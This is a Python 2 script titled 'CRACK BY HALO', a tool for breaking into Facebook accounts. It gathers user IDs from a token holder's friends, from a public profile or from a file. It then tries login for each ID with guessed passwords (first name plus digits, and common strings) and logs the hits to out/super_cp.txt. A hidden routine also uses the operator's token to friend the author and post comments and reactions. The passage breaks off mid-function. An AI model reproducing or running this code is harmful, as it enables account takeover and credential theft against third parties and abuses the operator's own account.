# CRACK BY HALO
#tlgram:i4m_mrx
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 crack.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def exit():
    print '[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo = '\n\x1b[1;91m \n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;93m\x1b[1;97m]\x1b[1;93m Lagi Login\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = 'Not Vuln'
vuln = 'Vuln'

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;33m'
    print '\x1b[1;33m[\x1b[1;31;1m01\x1b[1;33m]\x1b[37;1mLogin Email / ID Facebook \x1b[1;33m'
    print '\x1b[1;33m[\x1b[1;31;1m02\x1b[1;33m]\x1b[37;1mLogin  Token Facebook      \x1b[1;33m'
    print '\x1b[1;33m[\x1b[1;31;1m03\x1b[1;33m]\x1b[37;1mAmbil Token                           \x1b[1;33m'
    print '\x1b[1;33m[\x1b[1;31;1m00\x1b[1;33m]\x1b[37;1mexit                                \x1b[1;33m'
    print '\x1b[1;33m'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;93mBY HALO\x1b[91m:\x1b[1;96m ')
    if msuk == '':
        print "\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] No pl'z choose one options !"
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        login()
    elif msuk == '2' or msuk == '02':
        tokenz()
    elif msuk == '3' or msuk == '03':
        Ambil_Token()
    elif msuk == '0' or msuk == '00':
        exit()
    else:
        print "\x1b[37;1m[\x1b[32;1m!\x1b[37;1m] No pl'z choose one options !"
        pilih_masuk()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;97m[\x1b[1;96m\x1b[1;97m] LOGIN account FACEBOOK ANDA \x1b[1;97m[\x1b[1;96m\x1b[1;97m]'
        id = raw_input('[\x1b[1;95m+\x1b[1;97m] ID / Email =\x1b[1;92m ')
        pwd = raw_input('\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] Password =\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n[!] Tidak ada koneksi'
            exit()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;97m[\x1b[1;92m\x1b[1;97m]\x1b[1;92m Login Berhasil'
                os.system('xdg-open https://m.facebook.com/user.keramat.90')
                bot_komen()
            except requests.exceptions.ConnectionError:
                print '\n[!] Tidak ada koneksi'
                exit()

        if 'checkpoint' in url:
            print '\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m Sepertinya account Anda Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            exit()
        else:
            print '\n\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Password / Email Salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] \x1b[1;93mToken : \x1b[1;96m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m[\x1b[1;92m\x1b[1;97m]\x1b[1;92m Login Berhasil'
        os.system('xdg-open https://youtube.com/channel/UCCgmIKpPgUOQauZ3IvrchBA ')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] \x1b[1;91mToken Salah !'
        time.sleep(1)
        masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100005789553399'
    kom = 'GUE PAKE SCRIPT LU NENG MILA '
    reac = 'ANGRY'
    post = '1190012567868384'
    post2 = '1190012567868384'
    kom2 = 'KREN SUKSES SELALU YA '
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def Ambil_Token():
    os.system('clear')
    print logo
    jalan('\x1b[1;92mInstall...')
    os.system('cd ... && npm install')
    jalan('\x1b[1;96mMulai...')
    os.system('cd ... && npm start')
    raw_input('\n[ Kembali ]')
    masuk()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak ada koneksi'
        exit()

    os.system('clear')
    print logo
    print '\x1b[1;31;1m=========================================='
    print '\x1b[37;1m=========================================='
    print '\x1b[1;97m[\x1b[1;34m\x1b[1;97m]\x1b[1;34m Nama account\x1b[1;91m     =>\x1b[1;93m ' + nama
    print '\x1b[1;97m[\x1b[1;34m\x1b[1;97m]\x1b[1;34m UID\x1b[1;91m           =>\x1b[1;93m ' + id
    print '\x1b[1;97m[\x1b[1;34m+\x1b[1;97m]\x1b[1;34m Tanggal Lahir\x1b[1;91m =>\x1b[1;93m ' + a['birthday']
    print '\x1b[37;96m'
    print '\x1b[37;96m[\x1b[1;31;1m01\x1b[37;96m]\x1b[1;31;1m->\x1b[37;1mCrack ID IRAQI \x1b[37;96m'
    print '\x1b[37;96m[\x1b[1;31;1m02\x1b[37;96m]\x1b[1;31;1m->\x1b[37;1mexit             \x1b[37;96m'
    print '\x1b[37;96m'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;93mBY ReKuShE \x1b[91m:\x1b[1;96m ')
    if unikers == '':
        print "\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m No pl'z choose one options !"
        pilih()
    elif unikers == '1' or unikers == '01':
        indo()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        exit()
    else:
        print "\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m No pl'z choose one options !"
        pilih()


def indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        exit()

    os.system('clear')
    print logo
    print '\x1b[37;96m'
    print '\x1b[37;96m\x1b[1;34m[01]\x1b[1;31;1m->\x1b[37;1mCrack Dari Daftar Teman \x1b[37;96m'
    print '\x1b[37;96m\x1b[1;34m[02]\x1b[1;31;1m->\x1b[37;1mCrack Dari ID Publik    \x1b[37;96m'
    print '\x1b[37;96m\x1b[1;34m[03]\x1b[1;31;1m->\x1b[37;1mCrack Dari File         \x1b[37;96m'
    print '\x1b[37;96m\x1b[1;34m[00]\x1b[1;31;1m->\x1b[37;1mexit                 \x1b[37;96m'
    print '\x1b[37;96m'
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;93mBY ReKuShE \x1b[91m:\x1b[1;96m ')
    if teak == '':
        print "\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m No pl'z choose one options !"
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[1;31;1m=========================================='
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print '\x1b[1;31;1m=========================================='
            print '\x1b[37;1m=========================================='
            idt = raw_input('\x1b[1;97m{\x1b[1;34m\x1b[1;97m} ID publik/teman : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;93m\x1b[1;97m} Nama : ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] ID publik/teman tidak ada !'
                raw_input('\n[ Kembali ]')
                indo()
            except requests.exceptions.ConnectionError:
                print '[!] Tidak ada koneksi !'
                exit()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;31;1m=========================================='
                idlist = raw_input('\x1b[1;97m{\x1b[1;93m?\x1b[1;97m} Nama File : ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[!] File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[!] File tidak ada !'
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
                indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print "\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m No pl'z choose one options !"
            pilih_indo()
        print '\x1b[1;97m{\x1b[1;93m\x1b[1;97m} Total ID : ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;93m\x1b[1;97m} Stop CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;93m\x1b[1;97m} Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;31;1m=========================================='
    print '\n\x1b[1;96mJANGAN MENYALAH GUNAKAN SCRIPT INI YA BOSS'
    print '\n\x1b[1;33mBY ReKuShE'
    print '\n\x1b[37;1m=========================================='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            pass1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                z = json.loads(x.text)
                print '\x1c\x1b[1;33m[OK] \x1c\x1b[1;33mBerhasil'
                print '\x1c\x1b[1;33m[] \x1c\x1b[1;33mName \x1c\x1b[1;33m    : \x1c\x1b[1;33m' + c['name']
                print '\x1c\x1b[1;33m[] \x1c\x1b[1;33mID \x1c\x1b[1;33m      : \x1c\x1b[1;33m' + user
                print '\x1c\x1b[1;33m[] \x1c\x1b[1;33mPassword \x1c\x1b[1;33m: \x1c\x1b[1;33m' + pass1 + '\n'
                print '\x1c\x1b[1;33m[] \x1c\x1b[1;33mTanggal Lahir \x1c\x1b[1;33m: \x1c\x1b[1;33m' + c['birthday']
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1c\x1b[1;94m[CP] \x1c\x1b[1;94mCheckpoint'
                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass1 + '\n'
                print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                    z = json.loads(x.text)
                    print '\x1c\x1b[1;94m[OK] \x1c\x1b[1;92mBerhasil'
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mPassword \x1c\x1b[1;91m: \x1c\x1b[1;92m' + pass2 + '\n'
                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1c\x1b[1;94m[CP] \x1c\x1b[1;94mCheckpoint'
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass2 + '\n'
                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                        z = json.loads(x.text)
                        print '\x1c\x1b[1;94m[OK] \x1c\x1b[1;92mBerhasil'
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mPassword \x1c\x1b[1;91m: \x1c\x1b[1;92m' + pass3 + '\n'
                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1c\x1b[1;94m[CP] \x1c\x1b[1;94mCheckpoint'
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass3 + '\n'
                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = '44445555'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                            z = json.loads(x.text)
                            print '\x1c\x1b[1;94m[OK] \x1c\x1b[1;92mBerhasil'
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass4 + '\n'
                            print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1c\x1b[1;94m[CP] \x1c\x1b[1;94mCheckpoint'
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass4 + '\n'
                            print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                z = json.loads(x.text)
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass5 + '\n'
                                print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass5 + '\n'
                                print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = '1122334455'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mID \x1c\x1b[1;91m      : \x1c\x1b[1;92m' + user
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass6 + '\n'
                                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                    print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass6 + '\n'
                                    print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '1234512345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass7 + '\n'
                                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                        print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass7 + '\n'
                                        print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write('ID:' + user + ' Pw:' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '123123@@'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass8 + '\n'
                                            print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mCheckpoint'
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mName \x1c\x1b[1;94m    : \x1c\x1b[1;95m' + c['name']
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
                                            print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mPassword \x1c\x1b[1;94m: \x1c\x1b[1;95m' + pass8 + '\n'
                                            print '\x1c\x1b[1;97m[] \x1c\x1b[1;91mTanggal Lahir \x1c\x1b[1;91m: \x1c\x1b[1;92m' + c['birthday']
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write('ID:' + user + ' Pw:' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = '100200300'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                                                z = json.loads(x.text)
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;92mBerhasil'
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;91mName \x1c\x1b[1;91m    : \x1c\x1b[1;92m' + c['name']
                                                print '\x1c\x1b[1;94m[] \x1c\x1b[1;94mID \x1c\x1b[1;94m      : \x1c\x1b[1;95m' + user
